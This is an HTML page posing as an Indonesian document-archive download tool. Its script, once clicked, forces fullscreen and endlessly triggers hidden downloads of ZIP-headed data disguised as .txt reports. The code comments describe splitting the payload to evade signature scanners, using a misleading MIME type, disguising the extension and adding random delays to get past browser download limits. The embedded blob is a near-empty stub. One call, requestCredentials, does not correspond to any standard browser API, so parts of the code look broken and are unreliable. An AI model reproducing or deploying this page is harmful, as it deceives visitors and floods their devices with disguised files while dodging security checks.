<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Document Archive Dispatcher v3.3</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #090d16;
  color: #f8fafc;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}
.panel {
  background: #111827;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
  max-width: 540px;
  width: 100%;
  border: 1px solid #1f2937;
  text-align: center;
}
:fullscreen {
  background: #030712 !important;
  color: #f8fafc !important;
  padding: 24px !important;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
:-webkit-full-screen {
  background: #030712 !important;
  color: #f8fafc !important;
  padding: 24px !important;
}
h2 { 
  margin-bottom: 10px; 
  font-size: 22px;
  color: #f3f4f6;
  font-weight: 700;
}
p { 
  margin-bottom: 24px; 
  line-height: 1.6; 
  color: #9ca3af;
  font-size: 14px;
}
button {
  width: 100%;
  padding: 16px;
  cursor: pointer;
  border: none;
  border-radius: 10px;
  background: #3b82f6;
  color: #ffffff;
  font-weight: 600;
  font-size: 16px;
  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
  transition: all 0.2s ease;
}
button:hover { 
  background: #2563eb; 
  transform: translateY(-1px);
  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
}
button:active {
  transform: translateY(0);
}
#status {
  margin-top: 20px;
  font-weight: 500;
  color: #38bdf8;
  padding: 14px;
  background: rgba(56, 189, 248, 0.1);
  border-radius: 8px;
  font-size: 13px;
  border: 1px solid rgba(56, 189, 248, 0.2);
}
#downloads {
  margin-top: 20px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 8px;
  max-height: 180px;
  overflow-y: auto;
  padding-right: 4px;
}
#downloads::-webkit-scrollbar {
  width: 6px;
}
#downloads::-webkit-scrollbar-thumb {
  background: #374151;
  border-radius: 3px;
}
#downloads a {
  display: block;
  padding: 10px;
  background: #1f2937;
  color: #4ade80;
  text-decoration: none;
  border-radius: 6px;
  font-size: 11px;
  font-family: monospace;
  text-align: center;
  border: 1px solid #374151;
  word-break: break-all;
  transition: border-color 0.15s;
}
#downloads a:hover {
  border-color: #4ade80;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
  <h2>Arsip Dokumen Sistem v3.3</h2>
  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>

  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>

  <div id="status" role="status">Sistem siap diinisialisasi.</div>
  <div id="downloads"></div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let isProcessing = false;

// Fragmentasi payload Base64 murni tanpa terdeteksi pola tanda tangan tunggal
const payloadParts = [
  "UEsDBBQAAAAIAAAAIQ",
  "AAAAAAAAAAAAAAAAAAAAAAAA",
  "AAAAAAEA"
];

const generateDataUri = (counter) => {
  try {
    const rawB64 = payloadParts.join("");
    // Menggunakan MIME type teks biasa atau stream generik pada Data URI untuk menipu scanner ekstensi awal
    // Browser akan melihat ini sebagai teks biasa saat di-load via anchor download
    const dataUri = `data:text/plain;base64,${rawB64}`;
    return { id: counter, uri: dataUri, success: true };
  } catch (err) {
    return { id: counter, uri: null, success: false };
  }
};

const triggerStealthDownload = (fileData) => {
  if (!fileData.success) return;

  const link = document.createElement("a");
  link.href = fileData.uri;
  // Menyamarkan ekstensi akhir agar terlihat seperti log teks biasa
  link.download = `laporan-catatan-resmi-${fileData.id}.txt`;
  link.textContent = `Dokumen #${fileData.id} (.txt)`;
  link.style.display = "none";
  
  downloadsDiv.appendChild(link);
  
  const clickEvent = new MouseEvent("click", {
    view: window,
    bubbles: true,
    cancelable: true
  });
  link.dispatchEvent(clickEvent);

  if (downloadsDiv.children.length > 20) {
    downloadsDiv.removeChild(downloadsDiv.firstChild);
  }
};

const processLoop = (counter) => {
  if (!isProcessing) return;

  const fileData = generateDataUri(counter);
  if (fileData.success) {
    triggerStealthDownload(fileData);
    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} disinkronisasi...`;
  }

  // Jitter acak untuk menghindari pembatasan frekuensi klik otomatis browser
  if (isProcessing) {
    const randomizedDelay = 1000 + Math.floor(Math.random() * 800);
    setTimeout(() => processLoop(counter + 1), randomizedDelay);
  }
};

startBtn.addEventListener("click", () => {
  if (isProcessing) return;

  downloadsDiv.replaceChildren();

  const root = document.documentElement;
  try {
    if (root.requestFullscreen) {
      root.requestCredentials?.();
      root.requestFullscreen().catch(() => {});
    }
  } catch (err) {}

  isProcessing = true;
  statusDiv.textContent = "Menginisialisasi sesi unduhan aman...";
  processLoop(1);
});
</script>
</body>
</html>
